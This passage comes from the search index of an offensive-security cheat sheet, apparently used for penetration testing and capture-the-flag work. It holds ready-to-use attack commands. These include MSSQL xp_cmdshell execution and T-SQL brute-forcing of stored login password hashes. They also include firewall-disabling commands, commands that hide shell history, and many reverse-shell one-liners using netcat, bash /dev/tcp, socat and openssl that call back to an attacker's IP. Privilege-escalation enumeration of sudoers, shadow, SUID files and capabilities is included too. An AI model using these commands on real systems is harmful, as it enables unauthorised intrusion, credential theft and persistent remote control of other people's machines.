    "content": ". | List tables and system users-- List all databases SHOW DATABASES; -- Change database USE &lt;db-name&gt; -- Tables in the selected DB SHOW TABLES; -- List 'system' table SELECT * from &lt;db&gt;.system -- All system users info SELECT * from mysql.user; -- User currently running the DB SELECT CURRENT_USER(); -- User who started the DB SELECT USER(); -- User's permissions SELECT CURRENT_ROLE(); -- MySQL server version SELECT VERSION(); -- Current database SELECT DATABASE(); -- Current server variables SHOW VARIABLES; . | . ",
    "url": "http://localhost:4000/#sql--mysql--enumeration",
    "relUrl": "/#sql--mysql--enumeration"
  },"329": {
    "doc": "ftf-hacksheet",
    "title": "T-SQL (MSSQL)",
    "content": " ",
    "url": "http://localhost:4000/#sql--t-sql--mssql-",
    "relUrl": "/#sql--t-sql--mssql-"
  },"330": {
    "doc": "ftf-hacksheet",
    "title": "Connection",
    "content": " ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---connection",
    "relUrl": "/#sql--t-sql--mssql---connection"
  },"331": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": ". | osql::: Use default auth and master db osql -E :: Run the commands with: go . | sqlcmd::: Almost like osql sqlcmd -E :: Set the output width: -w&lt;cols&gt; . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---connection--windows",
    "relUrl": "/#sql--t-sql--mssql---connection--windows"
  },"332": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---connection--linux",
    "relUrl": "/#sql--t-sql--mssql---connection--linux"
  },"333": {
    "doc": "ftf-hacksheet",
    "title": "mssqlclient.py",
    "content": ". | Site - Impacket mssqlclient.py:mssqlclient.py &lt;DOMAIN/&gt;&lt;user&gt;@&lt;ip&gt; -windows-auth # Check the -k and -hashes flags . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---connection--linux--mssqlclient-py",
    "relUrl": "/#sql--t-sql--mssql---connection--linux--mssqlclient-py"
  },"334": {
    "doc": "ftf-hacksheet",
    "title": "sqsh",
    "content": ". | Site - Multi SQL shell:# Supports what mssqlclient doesn't sqsh -U &lt;user&gt; -P &lt;pass&gt; -D &lt;db&gt; -S &lt;ip/server&gt; # Use 'go' to run the SQL queries # &amp; 'go -m pretty' -&gt; better output . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---connection--linux--sqsh",
    "relUrl": "/#sql--t-sql--mssql---connection--linux--sqsh"
  },"335": {
    "doc": "ftf-hacksheet",
    "title": "Linked Servers",
    "content": " ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---linked-servers",
    "relUrl": "/#sql--t-sql--mssql---linked-servers"
  },"336": {
    "doc": "ftf-hacksheet",
    "title": "List",
    "content": ". | From here:-- Name only SELECT name FROM sys.servers -- Name and maybe IP SELECT name, data_source FROM sys.servers -- All info EXEC sp_linkedservers . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---linked-servers--list",
    "relUrl": "/#sql--t-sql--mssql---linked-servers--list"
  },"337": {
    "doc": "ftf-hacksheet",
    "title": "Execute Queries",
    "content": ". | From here:-- Use external double quotes and -- internal single quotes if needed EXEC &lt;name-linked-server&gt;.[master].sys.sp_executesql N'SELECT @@VERSION;' -- N'&lt;query&gt;' doesn't limit length -- Or EXEC('SELECT SYSTEM_USER;') AT &lt;name-linked-server&gt; -- Use double quotes in the name -- if it contains backslashes . | Check whether the access from the linked server to the current one has higher privileges (Trusted Link):EXEC \"&lt;linked-srv&gt;\".[master].sys.sp_executesql N'EXEC(''SELECT SYSTEM_USER;'') AT \"&lt;current-srv&gt;\"' . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---linked-servers--execute-queries",
    "relUrl": "/#sql--t-sql--mssql---linked-servers--execute-queries"
  },"338": {
    "doc": "ftf-hacksheet",
    "title": "Cheatsheets/Enumerations",
    "content": ". | MSF - auxiliary/admin/mssql/mssql_enum | Pentestmonkey | HackTricks | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---cheatsheets-enumerations",
    "relUrl": "/#sql--t-sql--mssql---cheatsheets-enumerations"
  },"339": {
    "doc": "ftf-hacksheet",
    "title": "Execute System Commands",
    "content": ". | From here:-- You may need to execute it in a DB USE master -- Check for high privileges SELECT IS_SRVROLEMEMBER('sysadmin') -- Enable the feature EXEC sp_configure 'show advanced option', '1' RECONFIGURE WITH OVERRIDE EXEC sp_configure 'xp_cmdshell', 1 RECONFIGURE -- Use the feature xp_cmdshell '&lt;shell-command&gt;' -- You may need to use a SELECT SELECT xp_cmdshell '&lt;shell-command&gt;' -- OR SELECT * FROM xp_cmdshell '&lt;shell-command&gt;' . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---execute-system-commands",
    "relUrl": "/#sql--t-sql--mssql---execute-system-commands"
  },"340": {
    "doc": "ftf-hacksheet",
    "title": "Execute Scripts",
    "content": ". | Scripts may be executed in a different user with higher privileges than IIS:EXEC sp_configure 'external scripts enabled', 1 RECONFIGURE WITH OVERRIDE -- Python and R are supported langs sp_execute_external_script @language =N'Python', @script=N'import os;os.system(\"whoami\")' -- R variant sp_execute_external_script @language =N'R', @script=N'shell(\"whoami\", NULL)' . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---execute-scripts",
    "relUrl": "/#sql--t-sql--mssql---execute-scripts"
  },"341": {
    "doc": "ftf-hacksheet",
    "title": "Write Text Files Without xp_cmdshell",
    "content": ". | From here:-- Step 1: Enable Ole Automation Procedures sp_configure 'show advanced options', 1 RECONFIGURE sp_configure 'Ole Automation Procedures', 1 RECONFIGURE -- You may need to use EXEC and OVERRIDE: EXEC sp_configure 'show advanced option', '1' RECONFIGURE WITH OVERRIDE -- Step 2: Write Text File DECLARE @OLE INT DECLARE @FileID INT EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\\&lt;file-path&gt;.txt', 8, 1 EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;string&gt;' EXECUTE sp_OADestroy @FileID EXECUTE sp_OADestroy @OLE . | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---write-text-files-without-xp_cmdshell",
    "relUrl": "/#sql--t-sql--mssql---write-text-files-without-xp_cmdshell"
  },"342": {
    "doc": "ftf-hacksheet",
    "title": "Create Backup to disk",
    "content": ". | From here:BACKUP DATABASE &lt;database&gt; TO DISK='C:\\&lt;path+name&gt;' WITH FORMAT . | Find more examples in docs.microsoft | . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---create-backup-to-disk",
    "relUrl": "/#sql--t-sql--mssql---create-backup-to-disk"
  },"343": {
    "doc": "ftf-hacksheet",
    "title": "List Users",
    "content": "SELECT name, password from syslogins . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---list-users",
    "relUrl": "/#sql--t-sql--mssql---list-users"
  },"344": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce Passwords",
    "content": ". | The rockyou dictionary needs to be trimmed for the attack as the PWDCOMPARE function has an input length limit: perl -ine &#39;print if not @seen{$_}++ and length $_ &lt; 129&#39; rockyou.txt | Note that older Windows Server versions are case-insensitive so use tr &#39;[A-Z]&#39; &#39;[a-z]&#39; before the previous perl (or add lc to the seen hash population) | The rockyou dictionary fits in its entirety if properly trimmed | Note that the ROWTERMINATOR is extremely important to get it right 0x0a -&gt; Unix/Windows 0x0d -&gt; Mac | Modern T-SQL commands for bruteforcing | . -- Most efficient (due to short circuit) that works in Windows Server 2000 -------------------------------------- -- Note that the crack will take more than one hour -------------------------------------- -- The length of @sName is kept at minimum to prevent long headings -------------------------------------- CREATE TABLE #tmp(checkPass NVARCHAR(128)) BULK INSERT #tmp FROM 'C:\\WINNT\\Temp\\rockyou.txt' WITH (ROWTERMINATOR = '0x0a') DECLARE login_cursor CURSOR FOR SELECT name, password FROM syslogins ORDER BY createdate OPEN login_cursor DECLARE @sName NVARCHAR(10), @sPass NVARCHAR(128) FETCH NEXT FROM login_cursor INTO @sName, @sPass WHILE @@FETCH_STATUS = 0 BEGIN SELECT @sName UNION SELECT TOP 1 checkPass FROM #tmp WHERE PWDCOMPARE(checkPass, @sPass) = 1 FETCH NEXT FROM login_cursor INTO @sName, @sPass END CLOSE login_cursor DEALLOCATE login_cursor DROP TABLE #tmp -------------------------------------- -- For at least Windows Server 2006 it may be possible to use the WITH &lt;name&gt; as ( select ... ) select ... &lt;name&gt; or use CROSS APPLY with another query or function (used like the INNER JOIN below but allowing short-circuiting) -------------------------------------- CREATE TABLE #tmp(checkPass NVARCHAR(128)) BULK INSERT #tmp FROM 'C:\\WINNT\\Temp\\rockyou.txt' WITH (ROWTERMINATOR = '0x0a') CREATE FUNCTION passCheck(@pass VARBINARY(128)) RETURNS TABLE AS RETURN ( SELECT TOP 1 * FROM #tmp WHERE PWDCOMPARE(checkPass, @pass) = 1 ) SELECT s.name, t.checkPass FROM syslogins s CROSS APPLY passCheck(s.password) t DROP TABLE #tmp -------------------------------------- -- Not short circuit but without loop works in Windows Server 2000 -------------------------------------- CREATE TABLE #tmp(CheckValue NVARCHAR(1000)) BULK INSERT #tmp FROM 'C:\\rockyou.txt' WITH (ROWTERMINATOR = '0x0a') SELECT s.name AS name, t.CheckValue AS password FROM syslogins s INNER JOIN #tmp t ON PWDCOMPARE(t.CheckValue, s.password) = 1 -------------------------------------- -- This one iterates over the dictionary instead of the syslogins (less efficient) -------------------------------------- -- Pipe osql -E -Q \"&lt;inline-query&gt;\" | findstr /v /C:\"^ ----\" /C:\"(1 row affected)\" /C:\"^ name\" /C:\"^$\" -- Or use the -o &lt;output&gt; flag -------------------------------------- declare file_cursor CURSOR FOR SELECT CheckValue FROM #tmp OPEN file_cursor DECLARE @passCmp sysname FETCH NEXT FROM file_cursor INTO @passCmp WHILE @@FETCH_STATUS = 0 BEGIN SELECT NAME FROM syslogins WHERE PWDCOMPARE(@passCmp, password) = 1 UNION SELECT @passCmp FETCH NEXT FROM file_cursor INTO @passCmp END CLOSE file_cursor DEALLOCATE file_cursor -------------------------------------- -- Unefficient while loop -------------------------------------- WHILE (SELECT COUNT(*) FROM #tmp WHERE line IS NOT NULL) &gt; 0 BEGIN SELECT TOP 1 @passCmp = line FROM #tmp SELECT NAME FROM syslogins WHERE PWDCOMPARE(@passCmp, password) = 1 UNION ALL SELECT @passCmp DELETE FROM #tmp WHERE line = @passCmp END . ",
    "url": "http://localhost:4000/#sql--t-sql--mssql---bruteforce-passwords",
    "relUrl": "/#sql--t-sql--mssql---bruteforce-passwords"
  },"345": {
    "doc": "ftf-hacksheet",
    "title": "SOQL - Salesforce SQL",
    "content": ". | Limited SQL without: . | UNION | Wildcards | String concat | Almost all functions except COUNT() | . | Strings are single quotes only | Usage of AND followed by OR require parentheses: ... OR (...) | Left member of comparison must be a column from the table being queried | Inner/Outer tables must differ from main one | Outer join limited to ID only:SELECT Name FROM table WHERE Id IN (SELECT Id FROM other_table ...) . | No apparent limitation for Inner join:SELECT Id, (SELECT Name FROM other_table) FROM table . | . ",
    "url": "http://localhost:4000/#sql--soql---salesforce-sql",
    "relUrl": "/#sql--soql---salesforce-sql"
  },"346": {
    "doc": "ftf-hacksheet",
    "title": "Encryption",
    "content": " ",
    "url": "http://localhost:4000/#encryption",
    "relUrl": "/#encryption"
  },"347": {
    "doc": "ftf-hacksheet",
    "title": "Notes",
    "content": ". | Key-based alphabetic ciphers may reveal the key through KPA using known-whitespace-trimmed-text as key | . ",
    "url": "http://localhost:4000/#encryption--notes",
    "relUrl": "/#encryption--notes"
  },"348": {
    "doc": "ftf-hacksheet",
    "title": "Websites",
    "content": " ",
    "url": "http://localhost:4000/#encryption--websites",
    "relUrl": "/#encryption--websites"
  },"349": {
    "doc": "ftf-hacksheet",
    "title": "Boxentriq",
    "content": ". | Site - Identify and crack ciphers | . ",
    "url": "http://localhost:4000/#encryption--websites--boxentriq",
    "relUrl": "/#encryption--websites--boxentriq"
  },"350": {
    "doc": "ftf-hacksheet",
    "title": "CyberChef",
    "content": ". | Site (github) - Multi-crypto site | Use Magic mode to detect encodings | . ",
    "url": "http://localhost:4000/#encryption--websites--cyberchef",
    "relUrl": "/#encryption--websites--cyberchef"
  },"351": {
    "doc": "ftf-hacksheet",
    "title": "SCWF",
    "content": ". | Site - Auto-crack cryptos (chaotic) | . ",
    "url": "http://localhost:4000/#encryption--websites--scwf",
    "relUrl": "/#encryption--websites--scwf"
  },"352": {
    "doc": "ftf-hacksheet",
    "title": "Crypto Site - One Time Pad",
    "content": ". | Site - Multiple crypto tools | . ",
    "url": "http://localhost:4000/#encryption--websites--crypto-site---one-time-pad",
    "relUrl": "/#encryption--websites--crypto-site---one-time-pad"
  },"353": {
    "doc": "ftf-hacksheet",
    "title": "quipqiup",
    "content": ". | Site - Automated crypto/cipher solver | . ",
    "url": "http://localhost:4000/#encryption--websites--quipqiup",
    "relUrl": "/#encryption--websites--quipqiup"
  },"354": {
    "doc": "ftf-hacksheet",
    "title": "Tools",
    "content": " ",
    "url": "http://localhost:4000/#encryption--tools",
    "relUrl": "/#encryption--tools"
  },"355": {
    "doc": "ftf-hacksheet",
    "title": "Ciphey",
    "content": ". | Site - AI auto-crackerciphey -t \"&lt;hash/encrypt&gt;\" # -w &lt;wlist&gt; - Words found in -t # -q - Quiet - Don't show progress . | . ",
    "url": "http://localhost:4000/#encryption--tools--ciphey",
    "relUrl": "/#encryption--tools--ciphey"
  },"356": {
    "doc": "ftf-hacksheet",
    "title": "RsaCtfTool",
    "content": ". | Site - Crack RSA/recover private key:# Obtain private RSA from .pub RsaCtfTool.py --publickey &lt;key.pub&gt; --private # sagemath and opt-depends required # Uncipher file RsaCtfTool.py --publickey &lt;key.pub&gt; --uncipherfile &lt;file&gt; # Convert to PEM format RsaCtfTool.py --publickey &lt;key.pub&gt; --convert_idrsa_pub . | . ",
    "url": "http://localhost:4000/#encryption--tools--rsactftool",
    "relUrl": "/#encryption--tools--rsactftool"
  },"357": {
    "doc": "ftf-hacksheet",
    "title": "GPG",
    "content": ". | Site - GPG tool - Cheatsheet# Import keys (public/private) gpg --import file.gpg # Decrypt messages gpg --decrypt msg.enc # List private keys gpg --list-secret-keys # Delete private key gpg --delete-secret-keys &lt;key&gt; # Delete public key gpg --delete-key &lt;key&gt; . | . ",
    "url": "http://localhost:4000/#encryption--tools--gpg",
    "relUrl": "/#encryption--tools--gpg"
  },"358": {
    "doc": "ftf-hacksheet",
    "title": "Decodify",
    "content": ". | Site - Find hashes on the net + ROT:dcode \"&lt;hash&gt;\" # All ROT (lowercase output) dcode -rot all \"&lt;hash&gt;\" . | . ",
    "url": "http://localhost:4000/#encryption--tools--decodify",
    "relUrl": "/#encryption--tools--decodify"
  },"359": {
    "doc": "ftf-hacksheet",
    "title": "Subbreaker",
    "content": ". | Site - En/decode/break classic crypto:subbreaker break --text \"&lt;text&gt;\" # --lang EN by default . | . ",
    "url": "http://localhost:4000/#encryption--tools--subbreaker",
    "relUrl": "/#encryption--tools--subbreaker"
  },"360": {
    "doc": "ftf-hacksheet",
    "title": "ROT",
    "content": ". | Site - Perform ROT en/decoding:# All 25 ROT seq 25 | xargs -I{} ./rot.py \"&lt;str&gt;\" {} . | . ",
    "url": "http://localhost:4000/#encryption--tools--rot",
    "relUrl": "/#encryption--tools--rot"
  },"361": {
    "doc": "ftf-hacksheet",
    "title": "balbuzard",
    "content": ". | Site - Extract and Crack encryption# Extracts bbharvest &lt;file&gt; # Cracks bbcrack &lt;file&gt; . | . ",
    "url": "http://localhost:4000/#encryption--tools--balbuzard",
    "relUrl": "/#encryption--tools--balbuzard"
  },"362": {
    "doc": "ftf-hacksheet",
    "title": "Active Directory",
    "content": " ",
    "url": "http://localhost:4000/#active-directory",
    "relUrl": "/#active-directory"
  },"363": {
    "doc": "ftf-hacksheet",
    "title": "addspn.py",
    "content": ". | Site - SPNs Ops on AD accounts over LDAP# Add SPN to &lt;target&gt; in &lt;ip/host&gt; addspn.py -u &lt;usr&gt; -p &lt;pass&gt; -t &lt;target-name&gt; -s &lt;SPN&gt; &lt;ip/host&gt; # -a - Use msDS-AdditionalDnsHostName # -r - Remove # -q - Show &lt;target&gt; SPNs . | . ",
    "url": "http://localhost:4000/#active-directory--addspn-py",
    "relUrl": "/#active-directory--addspn-py"
  },"364": {
    "doc": "ftf-hacksheet",
    "title": "dnstool.py",
    "content": ". | Site - DNS Ops on ADIDNS rec over LDAP# Add DNS record fqdn+ip on &lt;ip/host&gt; dnstool.py -u \"&lt;dom&gt;\\&lt;usr&gt;\" -p &lt;pass&gt; -a add -r &lt;target-rec/fqdn&gt; -d &lt;data-rec/ip&gt; &lt;ip/host&gt; # -a query - Query records # --print-zones - Query zones # --zone &lt;zone&gt; - Zone to search in # --forest - Look ForestDnsZones # See other -a options . | . ",
    "url": "http://localhost:4000/#active-directory--dnstool-py",
    "relUrl": "/#active-directory--dnstool-py"
  },"365": {
    "doc": "ftf-hacksheet",
    "title": "gMSADumper",
    "content": ". | Site - Dump service account pass (GMSA):gMSADumper.py -u &lt;user&gt; -p &lt;pass&gt; -d &lt;dom&gt; # -p &lt;lm:ntlm&gt; - Pass the Hash auth # -l &lt;dom.ctrl&gt; - For Pass the Hash # -k - Kerberos auth (+ -l) . | . ",
    "url": "http://localhost:4000/#active-directory--gmsadumper",
    "relUrl": "/#active-directory--gmsadumper"
  },"366": {
    "doc": "ftf-hacksheet",
    "title": "Firewall",
    "content": " ",
    "url": "http://localhost:4000/#firewall",
    "relUrl": "/#firewall"
  },"367": {
    "doc": "ftf-hacksheet",
    "title": "CentOS",
    "content": " ",
    "url": "http://localhost:4000/#firewall--centos",
    "relUrl": "/#firewall--centos"
  },"368": {
    "doc": "ftf-hacksheet",
    "title": "firewalld",
    "content": ". | Disable firewall:systemctl stop firewalld . | Check rules (ref):# List all rules firewall-cmd --list-all # List rule-groups firewall-cmd --get-active-zones firewall-cmd --get-services # List rule group content firewall-cmd --zone=&lt;rule&gt; --list-all firewall-cmd --zone=&lt;rule&gt; --list-ports . | . ",
    "url": "http://localhost:4000/#firewall--centos--firewalld",
    "relUrl": "/#firewall--centos--firewalld"
  },"369": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": ". | Disable firewall:netsh firewall set opmode disable . | Allow ports by services::: RDP access netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable . | Allow ports by number:ufw allow from &lt;ip&gt; proto tcp to any port &lt;port1&gt;,&lt;port2&gt;... | . ",
    "url": "http://localhost:4000/#firewall--windows",
    "relUrl": "/#firewall--windows"
  },"370": {
    "doc": "ftf-hacksheet",
    "title": "Reverse/Bind shells + TTY",
    "content": " ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty",
    "relUrl": "/#reverse-bind-shells---tty"
  },"371": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux",
    "relUrl": "/#reverse-bind-shells---tty--linux"
  },"372": {
    "doc": "ftf-hacksheet",
    "title": "Shells",
    "content": " ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--shells",
    "relUrl": "/#reverse-bind-shells---tty--linux--shells"
  },"373": {
    "doc": "ftf-hacksheet",
    "title": "Netcat Traditional/Ncat",
    "content": ". | Basic:# Use -u for UDP nc -n &lt;ip&gt; &lt;port&gt; -e /bin/sh ncat -n &lt;ip&gt; &lt;port&gt; -e /bin/sh # Or -c bash instead of -e . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--shells--netcat-traditional-ncat",
    "relUrl": "/#reverse-bind-shells---tty--linux--shells--netcat-traditional-ncat"
  },"374": {
    "doc": "ftf-hacksheet",
    "title": "Netcat OpenBSD",
    "content": "rm -f /tmp/f; mkfifo /tmp/f; /bin/sh -i &lt; /tmp/f 2&gt;&amp;1 | nc -n &lt;ip&gt; &lt;port&gt; &gt; /tmp/f . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--shells--netcat-openbsd",
    "relUrl": "/#reverse-bind-shells---tty--linux--shells--netcat-openbsd"
  },"375": {
    "doc": "ftf-hacksheet",
    "title": "Netcat Busybox",
    "content": "rm -f /tmp/f; mknod /tmp/f p; /bin/sh -i &lt; /tmp/f 2&gt;&amp;1 | nc -n &lt;ip&gt; &lt;port&gt; &gt; /tmp/f . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--shells--netcat-busybox",
    "relUrl": "/#reverse-bind-shells---tty--linux--shells--netcat-busybox"
  },"376": {
    "doc": "ftf-hacksheet",
    "title": "Socat",
    "content": ". | Client:socat EXEC:'bash -i',stderr TCP:&lt;ip&gt;:&lt;port&gt; . | Client PTY:socat EXEC:'bash -i',pty,ctty,stderr,setsid,sigint,sane TCP:&lt;ip&gt;:&lt;port&gt; . | Server PTY:# Use - instead of $(tty) socat GOPEN:$(tty),raw,echo=0 TCP-LISTEN:&lt;port&gt; . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--shells--socat",
    "relUrl": "/#reverse-bind-shells---tty--linux--shells--socat"
  },"377": {
    "doc": "ftf-hacksheet",
    "title": "OpenSSL",
    "content": ". | Client:rm -f /tmp/s; mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ip&gt;:&lt;port&gt; &gt; /tmp/s . | Server:# Generate the certificate openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # Start the server openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;port&gt; # Use ncat as alternative ncat --ssl -lnvp &lt;port&gt; . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--shells--openssl",
    "relUrl": "/#reverse-bind-shells---tty--linux--shells--openssl"
  },"378": {
    "doc": "ftf-hacksheet",
    "title": "Bash",
    "content": ". | Obtain a reverse-shell using bash:# UDP is also an option bash -i &amp;&gt;/dev/tcp/&lt;ip&gt;/8080 0&gt;&amp;1 . | Detach it from the current process:nohup bash -c 'setsid bash -i &amp;&gt;/dev/tcp/&lt;ip&gt;/8080 0&gt;&amp;1 &amp;' &gt;/dev/null 2&gt;&amp;1 &amp; # It may not work over webapps . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--shells--bash",
    "relUrl": "/#reverse-bind-shells---tty--linux--shells--bash"
  },"379": {
    "doc": "ftf-hacksheet",
    "title": "TTY/PTY Upgrade",
    "content": " ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--tty-pty-upgrade",
    "relUrl": "/#reverse-bind-shells---tty--linux--tty-pty-upgrade"
  },"380": {
    "doc": "ftf-hacksheet",
    "title": "Script",
    "content": "exec /usr/bin/script -qc /bin/bash /dev/null . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--tty-pty-upgrade--script",
    "relUrl": "/#reverse-bind-shells---tty--linux--tty-pty-upgrade--script"
  },"381": {
    "doc": "ftf-hacksheet",
    "title": "Python",
    "content": ". | Using PTY:exec python -c \"import pty; pty.spawn('/bin/sh')\" . | Using Subprocess:exec python -c \"__import__('subprocess').call(['/bin/bash'])\" . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--tty-pty-upgrade--python",
    "relUrl": "/#reverse-bind-shells---tty--linux--tty-pty-upgrade--python"
  },"382": {
    "doc": "ftf-hacksheet",
    "title": "Perl",
    "content": ". | Using exec:exec perl -e \"exec '/bin/sh';\" . | Using backquotes:exec perl -e \"print `/bin/sh`;\" . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--tty-pty-upgrade--perl",
    "relUrl": "/#reverse-bind-shells---tty--linux--tty-pty-upgrade--perl"
  },"383": {
    "doc": "ftf-hacksheet",
    "title": "Socat",
    "content": "socat EXEC:\"/bin/sh -i\",pty,ctty,stderr,setsid,sigint,sane - . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--tty-pty-upgrade--socat",
    "relUrl": "/#reverse-bind-shells---tty--linux--tty-pty-upgrade--socat"
  },"384": {
    "doc": "ftf-hacksheet",
    "title": "Full Interactivity",
    "content": ". | Check that the system can be upgraded:# stty needs to be available type stty # Or resize type resize # It may be hidden find / -name resize\\* -type f 2&gt;/dev/null # Or check whether $ROWS and $COLUMNS # are used: export set # Very recommended to be available type reset . | Background the shell with Ctrl-Z | Obtain the size of the current terminal# The numbers are ROWS COLUMNS stty size # POSIX alternative stty -a | sed -n 's/.*\\(\\(\\(rows\\|columns\\)[^;]*; \\)\\{2\\}\\).*/\\1/p' # With tput echo 'lines\\ncols' | tput -S . | Enable RAW mode + foreground the shell:stty raw -echo; fg . | Introduce the following blindly:# Set the terminal type export TERM=xterm-256color # Fallbacks: # xterm, screen, linux, or dumb # Sustitute with the previous values stty rows &lt;rows&gt; cols &lt;cols&gt; # Or, if resize is available export ROWS=&lt;rows&gt; export COLUMNS=&lt;cols&gt; resize . | Apply the new changes:exec /bin/bash -i reset . | Final exports:export SHELL=/bin/bash export HOME=/tmp export PAGER=less . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--linux--full-interactivity",
    "relUrl": "/#reverse-bind-shells---tty--linux--full-interactivity"
  },"385": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--windows",
    "relUrl": "/#reverse-bind-shells---tty--windows"
  },"386": {
    "doc": "ftf-hacksheet",
    "title": "Shells",
    "content": " ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--windows--shells",
    "relUrl": "/#reverse-bind-shells---tty--windows--shells"
  },"387": {
    "doc": "ftf-hacksheet",
    "title": "Netcat Traditional/Ncat",
    "content": ". | netcat | ncat-portable-5.59BETA1 | Note that non-interactive sessions will require cmd.exe:cmd.exe /c nc.exe &lt;ip&gt; &lt;port&gt; -e cmd . | . ",
    "url": "http://localhost:4000/#reverse-bind-shells---tty--windows--shells--netcat-traditional-ncat",
    "relUrl": "/#reverse-bind-shells---tty--windows--shells--netcat-traditional-ncat"
  },"388": {
    "doc": "ftf-hacksheet",
    "title": "System Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#system-enumeration",
    "relUrl": "/#system-enumeration"
  },"389": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": ". | Prevent command logging:# Bash echo $HISTFILE export HISTFILE=/dev/null # Zsh # Also check HISTFILE echo $HISTFILE # Push a new history stack fc -p # Pop current history stack (deleting) fc -P . | List environment variables:echo $USER echo $HOME echo $SHELL echo $PWD echo $PATH # all export set # Modify for all programs in shell export VAR=&lt;value&gt; # Make it permanent for current user echo 'export VAR=&lt;value&gt;' &gt;&gt; ~/.bashrc . | Locate users that could be used for logging in:# Also check /etc/shadow grep -v 'nologin\\|false' /etc/passwd . | User identification:whoami # User, Group, and Context ID id -a # Logged users who # Logged users - extra info who -a # Logged users + stats + login process w . | Permissions identification:# Check if sudo may be vulnerable sudo -V # Commands that can be run with sudo # without password prompting sudo -l # Also note: env_keep+=LD_PRELOAD # Same but for all users less /etc/sudoers # Find files with the SUID flag: find / \\( -perm -4000 -o -perm -2000 \\) -type f -ls 2&gt;/dev/null # See how to leverage them: # https://gtfobins.github.io # Use ldd to detect missing libraries # Find folders with the S[UG]ID flags: find / \\( -perm -4000 -o -perm -2000 \\) -type d -ls 2&gt;/dev/null # New files on such directories obtain # the folder's S[UG]ID automatically # Find everything else: find / \\( -perm -4000 -o -perm -2000 \\) \\! -type f \\! -type d -ls 2&gt;/dev/null # Everything writable and executable # can be injected with evil code # Locate binaries with capabilities getcap -r / 2&gt;/dev/null # CAP_SETUID allows privesc: GTFObins # Caps are retained in subprocesses # Users with capabilities less /etc/security/capability.conf # Sevices with capabilities grep -r 'AmbientCapabilities=' /etc/systemd # Other interesting Caps for privesc: # - CAP_SYS_ADMIN # - CAP_SYS_PTRACE # - CAP_SYS_MODULE # - CAP_DAC_READ_SEARCH # - CAP_DAC_OVERRIDE # - CAP_CHOWN # - CAP_FORMER # - CAP_SETGID # - CAP_SETFCAP # - CAP_SETUID # Caps that may aid in privesc: # - CAP_KILL # - CAP_NET_BIND_SERVICE # - CAP_NET_RAW # - CAP_NET_ADMIN + CAP_NET_RAW # - CAP_LINUX_IMMUTABLE . | List OS and version:# All details cat /proc/version # Kernel details uname -a # Distro detail cat /etc/issue cat /etc/*-release # Check the Dirty COW section . | Kernel hardening using checksec:./checksec --kernel 2&gt;/dev/null . | List scheduled tasks:# Current user crontab -l # Some systems may use cru # System scheduled tasks less /etc/crontab # Systemd timers systemctl list-timers . | Find files/directories:ls -lah / ls -lah /root ls -lah /home ls -lah /var ls -lah /var/spool ls -lah /var/mail ls -lah /var/spool/mail ls -lah /etc/security ls -lah /etc/init ls -lahd /etc/init ls -lah /etc/init.d ls -lahd /etc/init.d ls -lah /etc/rc.d ls -lahd /etc/rc.d ls -lah /etc/rc.d/init.d ls -lahd /etc/rc.d/init.d ls -lah /etc/systemd/system ls -lahd /etc/systemd/system find /var/log -type f 2&gt;/dev/null find /var/cache -type f 2&gt;/dev/null find /var/crash -type f 2&gt;/dev/null # Exclude paths find /var/www \\! -path /var/www/error/\\* -type f 2&gt;/dev/null # Files owned by specific users/groups find / \\( -user adm -o -group adm \\) -ls 2&gt;/dev/null | grep -v ' /sys\\| /proc' ls -lah /etc ls -lah /usr/src ls -lah /usr/local ls -lah /opt ls -lah /var/opt # Show the commands of the processes find /proc -name cmdline -exec sh -c 'grep -qv \"^ *$\" {} &amp;&amp; { echo; echo {} | sed \"h;s/./-/gp;H;x\"; cat {}; echo; }' \\; 2&gt;/dev/null # All world writable files find / -perm -o+w -type f \\! -path /proc \\! -path /sys 2&gt;/dev/null # Check if they are writable ls -lahd 